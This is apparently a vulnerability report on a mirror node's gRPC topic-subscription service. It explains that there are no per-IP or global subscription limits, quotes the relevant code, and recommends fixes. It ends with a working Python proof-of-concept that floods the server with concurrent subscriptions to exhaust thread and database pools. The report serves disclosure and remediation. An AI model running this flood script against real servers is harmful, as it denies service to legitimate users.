### Title
Unbounded Concurrent Subscription Exhaustion via Missing Per-IP and Global Subscription Limits in `retrieve()`

### Summary
`PollingTopicMessageRetriever.retrieve()` creates a long-lived reactive polling stream for every caller with no per-IP, per-topic, or global subscription cap. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — limits calls per single TCP connection but places no bound on the number of TCP connections an attacker may open. An unprivileged attacker can open arbitrarily many connections, saturate the `boundedElastic` scheduler thread pool and the database connection pool, and deny service to legitimate subscribers.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `PollingTopicMessageRetriever.retrieve()`.

In `retrieve()` (lines 45–63 of `PollingTopicMessageRetriever.java`), every accepted call unconditionally constructs a `PollingContext` and schedules recurring DB polls on `Schedulers.boundedElastic()` (constructed at line 41):

```java
// PollingTopicMessageRetriever.java:45-63
public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
    if (!retrieverProperties.isEnabled()) {
        return Flux.empty();
    }
    PollingContext context = new PollingContext(filter, throttled);
    return Flux.defer(() -> poll(context))
            .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                    .jitter(0.1)
                    .withFixedDelay(context.getFrequency())   // default 2 s
                    .withScheduler(scheduler))                 // boundedElastic
            ...
            .timeout(retrieverProperties.getTimeout(), scheduler)  // default 60 s idle
```

The only server-level connection guard is configured in `GrpcConfiguration.java` (lines 28–35):

```java
serverBuilder.maxConcurrentCallsPerConnection(
    nettyProperties.getMaxConcurrentCallsPerConnection()); // default 5
```

This limits concurrent gRPC streams per **single TCP connection** to 5. It does not limit:
- The total number of TCP connections from one IP.
- The total number of active subscriptions server-wide.
- The rate at which new connections are accepted.

`TopicMessageServiceImpl` tracks subscriptions with `subscriberCount` (line 48) but this `AtomicLong` feeds only a Micrometer `Gauge` metric — it is never compared against a maximum to reject new subscriptions (lines 89–90):

```java
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

**Why existing checks fail:**

| Guard | Scope | Enforced? |
|---|---|---|
| `maxConcurrentCallsPerConnection = 5` | Per TCP connection | Yes, but attacker opens N connections |
| `retrieverProperties.getTimeout() = 60 s` | Idle timeout per stream | Only fires if no messages emitted for 60 s; live topics keep streams alive indefinitely |
| `subscriberCount` | Global metric | Metric only — never used to reject |
| No per-IP connection limit | — | Absent |
| No total connection limit | — | Absent |

### Impact Explanation

Each subscription created by `retrieve()` occupies:
- A thread slot in `Schedulers.boundedElastic()` (Reactor default: `10 × CPU cores` threads, up to 100 000 queued tasks).
- A database connection from the pool (one `findByFilter` query every 2 seconds per subscription).
- Heap memory for `PollingContext` and its `AtomicLong`/`AtomicReference` fields.

Once the thread pool and DB connection pool are saturated, new subscriptions block or fail. Legitimate subscribers receive `RESOURCE_EXHAUSTED` or connection-refused errors and cannot receive gossiped topic messages. The attack is a complete denial of the HCS subscription service.

### Likelihood Explanation

No authentication or authorization is required to call `subscribeTopic`. A single attacker machine can open thousands of TCP connections (OS socket limits permitting) and multiplex 5 gRPC streams per connection. With a modest 200 connections × 5 streams = 1 000 concurrent subscriptions, a typical 4-core pod's `boundedElastic` pool (40 threads) is overwhelmed. The attack is trivially scriptable with any gRPC client library and is repeatable indefinitely because there is no connection-rate or subscription-rate enforcement at the application layer.

### Recommendation

1. **Enforce a global subscription cap**: Check `subscriberCount` against a configurable maximum before accepting a new subscription in `TopicMessageServiceImpl.subscribeTopic()`. Return `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Add a per-IP concurrent-connection limit**: In `GrpcConfiguration`, add a `ServerInterceptor` or use Netty's `maxConnectionsPerIp` (if available in the version in use) to cap TCP connections per remote address.
3. **Configure `maxConnectionAge`**: Call `serverBuilder.maxConnectionAge(duration, unit)` to recycle long-lived connections and prevent indefinite resource hold.
4. **Add connection-rate limiting**: Implement a token-bucket interceptor at the gRPC server level (analogous to the `ThrottleManagerImpl` used in the web3 module) keyed on client IP.
5. **Enforce `maxConcurrentCallsPerConnection` at the topic level**: Reject subscriptions to the same topic from the same connection beyond a configurable threshold.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 300   # 300 TCP connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # no endTime → stream lives until server timeout (60 s idle)
    )
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for w in workers:
    w.start()
# 300 × 5 = 1500 concurrent subscriptions → boundedElastic exhausted,
# DB pool exhausted, legitimate subscribers denied.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L41-42)
```java
        scheduler = Schedulers.boundedElastic();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L45-63)
```java
    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L88-91)
```java
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L25-28)
```java
    private Duration pollingFrequency = Duration.ofSeconds(2L);

    @NotNull
    private Duration timeout = Duration.ofSeconds(60L);
```
